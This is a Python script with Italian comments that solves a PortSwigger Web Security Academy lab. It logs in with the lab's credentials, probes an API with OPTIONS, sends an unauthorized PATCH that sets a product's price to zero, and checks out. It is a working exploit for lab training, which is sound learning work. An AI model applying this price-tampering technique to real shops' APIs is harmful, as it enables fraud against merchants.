import sys
import json
import urllib3
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

# Disabilito i warning sui certificati (Kali + ZAP + HTTPS)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==========================
# CONFIGURAZIONE DI BASE
# ==========================

BASE_URL = "https://0ad600da0370703182ff15a500ec008f.web-security-academy.net"

#Credenziali fornite dal lab
USERNAME = "wiener"
PASSWORD = "peter"

#ID del prodotto "Lightweight l33t Leather Jacket"
TARGET_PRODUCT_ID = 1

# Proxy ZAP (come nel primo script)
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


# ==========================
# FUNZIONI DI SUPPORTO
# ==========================

def get_session() -> requests.Session:
    """
    Crea una sessione HTTP:
    - che passa dal proxy di ZAP
    - con verify=False per non esplodere su HTTPS ispezionato
    """
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    return s


def get_csrf(html: str) -> str | None:
    """
    Cerca un <input name="csrf" value="..."> e ritorna il value.
    """
    soup = BeautifulSoup(html, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if token_input and token_input.has_attr("value"):
        return token_input["value"]
    return None


def check_lab_solved(html: str) -> bool:
    """
    Controlla se compare la stringa tipica dei lab PortSwigger.
    """
    return "Congratulations, you solved the lab" in html


# ==========================
# LOGIN E NAVIGAZIONE
# ==========================

def login(session: requests.Session, username: str, password: str) -> None:
    """
    1. GET /login -> prendo il CSRF
    2. POST /login con username/password
    """
    login_url = urljoin(BASE_URL, "/login")

    r = session.get(login_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET /login fallita, status {r.status_code}")

    csrf = get_csrf(r.text)
    if not csrf:
        raise RuntimeError("CSRF non trovato nella pagina /login")

    data = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }

    r = session.post(login_url, data=data)
    if r.status_code not in (200, 302):
        print("[DEBUG] Login status:", r.status_code)
        print("[DEBUG] Body:\n", r.text[:500])
        raise RuntimeError(f"POST /login fallita, status {r.status_code}")

    # Dopo il redirect dovremmo vedere "My account" o simili
    if "Log out" in r.text or "My account" in r.text or "Your username is: wiener" in r.text:
        print("[+] Login come 'wiener' riuscito.")
    else:
        print("[!] Login forse NON riuscito, controlla comunque la sessione.")


# ==========================
# PARTE API: PREZZO PRODOTTO
# ==========================

def show_allowed_methods(session: requests.Session, product_id: int) -> None:
    """
    Usa il metodo OPTIONS per vedere quali HTTP methods sono ammessi
    sull'endpoint /api/products/<id>/price.
    È didattico: mostra come scoprire funzionalità aggiuntive.
    """
    api_url = urljoin(BASE_URL, f"/api/products/{product_id}/price")
    r = session.options(api_url)

    if "Allow" in r.headers:
        print(f"[+] OPTIONS {api_url} -> Allow: {r.headers['Allow']}")
    else:
        print("[!] Nessun header Allow trovato nella risposta a OPTIONS.")


def patch_product_price(session: requests.Session, product_id: int, new_price: int) -> None:
    """
    Modifica il prezzo di un prodotto via:
        PATCH /api/products/<id>/price
    con body JSON: {"price": new_price}

    1. Costruisce l'endpoint API.
    2. Invia un PATCH con Content-Type: application/json.
    3. Controlla la risposta JSON.
    """
    api_url = urljoin(BASE_URL, f"/api/products/{product_id}/price")

    headers = {
        "Content-Type": "application/json",
    }
    payload = {"price": new_price}

    print(f"[*] Invio PATCH a {api_url} con price={new_price} ...")
    r = session.request("PATCH", api_url, headers=headers, data=json.dumps(payload))

    if r.status_code != 200:
        print("[DEBUG] PATCH status:", r.status_code)
        print("[DEBUG] Body:\n", r.text[:500])
        raise RuntimeError(f"PATCH {api_url} fallita, status {r.status_code}")

    try:
        data = r.json()
    except ValueError:
        print("[DEBUG] Risposta non JSON:", r.text[:500])
        raise RuntimeError("La risposta alla PATCH non è JSON, qualcosa non torna.")

    print(f"[+] Risposta PATCH JSON: {data}")

    price_str = data.get("price")
    if price_str:
        print(f"[+] Nuovo prezzo dal server: {price_str}")
    else:
        print("[!] Campo 'price' non presente nella risposta JSON.")


# ==========================
# CARRELLO E ORDINE
# ==========================

def add_product_to_cart(session: requests.Session, product_id: int) -> None:
    """
    1. GET /product?productId=<id> -> pagina prodotto, da cui estraiamo il form "Add to cart".
    2. Troviamo il <form> che posta a /cart.
    3. Costruiamo il dizionario data con tutti gli <input>, forzando productId=<id>.
    4. POST /cart con i dati del form.

    In questo modo replichiamo esattamente il comportamento del browser.
    """
    product_url = urljoin(BASE_URL, f"/product?productId={product_id}")
    r = session.get(product_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET {product_url} fallita, status {r.status_code}")

    soup = BeautifulSoup(r.text, "html.parser")

    form = None
    # cerchiamo un form che punti a /cart
    for f in soup.find_all("form"):
        action = f.get("action", "")
        if "/cart" in action:
            form = f
            break

    if not form:
        raise RuntimeError("Form per aggiungere al carrello non trovato nella pagina prodotto.")

    action = form.get("action")
    cart_url = urljoin(BASE_URL, action)

    data = {}
    for inp in form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        value = inp.get("value", "")
        if name == "productId":
            value = str(product_id)
        data[name] = value

    print(f"[*] Invio POST {cart_url} per aggiungere productId={product_id} al carrello...")
    r = session.post(cart_url, data=data)
    if r.status_code not in (200, 302):
        print("[DEBUG] Add-to-cart status:", r.status_code)
        print("[DEBUG] Body:\n", r.text[:500])
        raise RuntimeError(f"POST {cart_url} fallita, status {r.status_code}")

    print("[+] Prodotto aggiunto al carrello (o almeno la richiesta è stata accettata).")


def checkout_cart(session: requests.Session) -> None:
    """
    1. GET /cart -> prendo il CSRF.
    2. POST /cart/checkout con csrf.
    3. Controllo se il lab risulta risolto nella risposta.
    """
    cart_url = urljoin(BASE_URL, "/cart")
    r = session.get(cart_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET /cart fallita, status {r.status_code}")

    csrf = get_csrf(r.text)
    if not csrf:
        raise RuntimeError("CSRF non trovato nella pagina /cart")

    checkout_url = urljoin(BASE_URL, "/cart/checkout")
    data = {"csrf": csrf}

    print(f"[*] Invio POST {checkout_url} per fare il checkout...")
    r = session.post(checkout_url, data=data)

    if r.status_code not in (200, 302):
        print("[DEBUG] Checkout status:", r.status_code)
        print("[DEBUG] Body:\n", r.text[:500])
        raise RuntimeError(f"POST /cart/checkout fallita, status {r.status_code}")

    # Se requests segue il redirect, qui potremmo già avere la pagina di conferma
    if check_lab_solved(r.text):
        print("[+] Ordine completato. Lab risolto! 🎉")
    else:
        print("[!] Checkout completato, ma non vedo ancora il messaggio di lab risolto.")
        # Volendo qui potresti fare un GET manuale a /cart/order-confirmation
        # per essere super safe.


# ==========================
# MAIN
# ==========================

def main():
    if "INSERISCI-QUI-IL-TUO-LAB" in BASE_URL:
        print("[-] Devi configurare BASE_URL con l'URL del tuo lab PortSwigger.")
        sys.exit(1)

    session = get_session()

    print("[*] Avvio exploit sul lab 'Finding and exploiting an unused API endpoint'...")

    # 1) Login come wiener
    login(session, USERNAME, PASSWORD)

    # 2) (didattico) mostra i metodi ammessi sull'endpoint API del giubbotto
    show_allowed_methods(session, TARGET_PRODUCT_ID)

    # 3) PATCH del prezzo del giubbotto a 0
    patch_product_price(session, TARGET_PRODUCT_ID, 0)

    # 4) Aggiungi il giubbotto al carrello
    add_product_to_cart(session, TARGET_PRODUCT_ID)

    # 5) Checkout del carrello
    checkout_cart(session)


if __name__ == "__main__":
    main()
